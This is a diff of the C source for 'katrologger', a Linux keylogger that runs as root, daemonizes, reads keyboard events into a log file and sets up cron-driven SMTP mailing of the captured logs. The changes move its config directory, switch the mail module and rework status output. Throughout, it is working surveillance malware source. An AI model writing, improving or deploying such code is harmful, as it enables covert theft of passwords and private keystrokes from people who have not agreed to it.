@@ -12,31 +12,30 @@
 #include <errno.h>
 #include <sys/types.h>
 #include <dirent.h>
+
 #include "mappings.h"
 #include "event.h"
 #include "status.h"
 #include "usage.h"
-#include "curl_smtp.h"
+#include "smtp_mail.h"
 
+#define PATH_CONF "/root/.katrologger/path.conf"
+#define TIME_CONF "/root/.katrologger/time.conf"
+#define SIZE_CONF "/root/.katrologger/size.conf"
 #define PID_FILE "/var/run/katrologger.pid"
+#define SMTP_LOG "/root/.katrologger/ksmtp.log"
 #define CRON_SMTP "/var/spool/cron/cronjob"
 #define CRON_SMTP_RUN "/var/spool/cron/crontabs/cronjob"
-#define PATH_CONF "/root/.config/katrologger/path.conf"
-#define TIME_CONF "/root/.config/katrologger/time.conf"
-#define SIZE_CONF "/root/.config/katrologger/size.conf"
-#define SMTP_CONF "/root/.config/katrologger/smtp.conf"
-#define SMTP_LOGS "/var/log/smtp.log"
 
 const char *path_conf = PATH_CONF;
 const char *time_conf = TIME_CONF;
 const char *size_conf = SIZE_CONF;
-const char *smtp_conf = SMTP_CONF;
 const char *check_file_pid = PID_FILE;
 const char *cron_file = CRON_SMTP;
 const char *smtp_file = CRON_SMTP_RUN;
-const char *smtp_logs = SMTP_LOGS;
+const char *smtp_log = SMTP_LOG;
 
-const char *dir_config = "/root/.config/katrologger";
+const char *dir_config = "/root/.katrologger";
 const char *dev_input;
 
 FILE *get_pid;
@@ -49,6 +48,7 @@ FILE *filetime;
 FILE *filesmtp;
 FILE *filepath;
 FILE *key;
+FILE *path_outfile;
 
 int flag_running = 0;
 int input_keyboard;
@@ -59,7 +59,7 @@ char buffer_filesmtp[1024];
 char outfile[100];
 char n_pid[20];
 
-DIR *dir;
+DIR *directory;
 
 int kill_process(int kill_pid){
     if(kill(kill_pid, SIGKILL) != 0){
@@ -88,12 +88,12 @@ if (flag_status == 1){
       read_size();
 
       system("clear");
-      printf("●  Active - Keylogger Is Running\n");
-      printf("      Path : %s\n", buffer_path);
-      printf("      SMTP : %s\n", buffer_smtp);
-      printf("       PID : %s\n", buffer_pid);
-      printf("    Memory : %s Bytes\n", buffer_size);
-      printf("Start Time : %s\n\n", buffer_time);
+      printf("●   Active - Keylogger is running\n");
+      printf("       Path: %s\n", buffer_path);
+      printf("   Emailing: %s\n", buffer_smtp);
+      printf("        PID: %s\n", buffer_pid);
+      printf("     Memory: %s bytes\n", buffer_size);
+      printf(" Start Time: %s\n\n", buffer_time);
       print_path_logs();
       printf("\n");
 
@@ -126,23 +126,22 @@ if(flag_kill == 1) {
             fclose(fopen(PATH_CONF, "w"));
             fclose(fopen(SIZE_CONF, "w"));
             fclose(fopen(TIME_CONF, "w"));
-            fclose(fopen(SMTP_CONF, "w"));
+            fclose(fopen(SMTP_LOG, "w"));
 
             if( (access(CRON_SMTP, F_OK)) == 0 ) {
                 remove(CRON_SMTP);
-                remove("/var/spool/cron/crontabs/cronjob");
+                remove(CRON_SMTP_RUN);
             }
-            system("clear");
             printf("[x] Stop Keylogger\n");
             exit(0);
         }
     } else {
-      printf("[x] Keylogger Is Not Running\n");
+      printf("[x] Keylogger is not running\n");
       exit(1);
     }
 }
 
-if(flag_smtp == 1){ curl_mail(argc, argv); }
+if(flag_smtp == 1){ smtp_mail(argc, argv); }
 
 if(smtp_status == 1){
   check_status();
@@ -151,43 +150,49 @@ if(smtp_status == 1){
     printf("[x] Keylogger Inactive \n");
 
   } else if ( (access(smtp_file, F_OK)) == 0 ){
-    system("clear");
-    readsmtp = fopen(SMTP_CONF, "r");
+    readsmtp = fopen(SMTP_LOG, "r");
 
     while (fgets(buffer_filesmtp, sizeof(buffer_filesmtp), readsmtp) != NULL ) {
       printf("%s", buffer_filesmtp);
     }
     fclose(readsmtp);
-    printf("\n");
-    print_smtp_logs();
     return 0;
   } else {
-    printf("[x] SMTP Disabled");
+    printf("[x] SMTP disabled\n");
   }
   exit(0);
 }
-
-if (smtp_help == 1){ smtp_helper(); }
 
 int check_root = getuid();
 if (check_root != 0) { noroot("Not running as root!"); }
 
 check_status();
 if (flag_running == 1) {
-  system("clear");
     printf("[x] Keylogger is already running\n");
     printf("Use: katrologger --status\n");
   exit(1);
 }
 
-dir = opendir(dir_config);
-  if (dir) {
-    closedir(dir);
+directory = opendir(dir_config);
+  if (directory) {
+      closedir(directory);
     } else if (ENOENT == errno) {
       mkdir(dir_config, S_IRWXU | S_IXGRP | S_IRGRP);
-    closedir(dir);
+      closedir(directory);
+    }
+
+path_outfile = fopen(outfile, "a");
+if (path_outfile == NULL) {
+  printf("[Error] Specified path does not exist: %s\n", outfile);
+  exit(1);
+} else {
+  fprintf(path_outfile, "\n---------------------\n");
+  fprintf(path_outfile, "| KEYLOGGER STARTED |\n");
+  fprintf(path_outfile, "---------------------\n");
+  fclose(path_outfile);
 }
 
+// Logging
 time_t t;
 struct tm *timeinfo;
 char buffer_timeinfo[30];
@@ -203,6 +208,7 @@ fclose(filetime);
 filepath = fopen(path_conf, "w");
 fprintf(filepath, "%s", outfile);
 fclose(filepath);
+// --- End ---
 
 struct input_event events;
 dev_input = event_keyboard();
@@ -222,8 +228,8 @@ if (id_process < 0) {
   printf("Fork Failed!\n");
   exit(1);
 } else if(id_process > 0) {
-  system("clear");
-  printf("[+] Keylogger Initialized\n");
+  printf("[+] Keylogger started\n");
+  printf("[-] PID: %d\n", id_process);
 }
 
 sid = setsid();
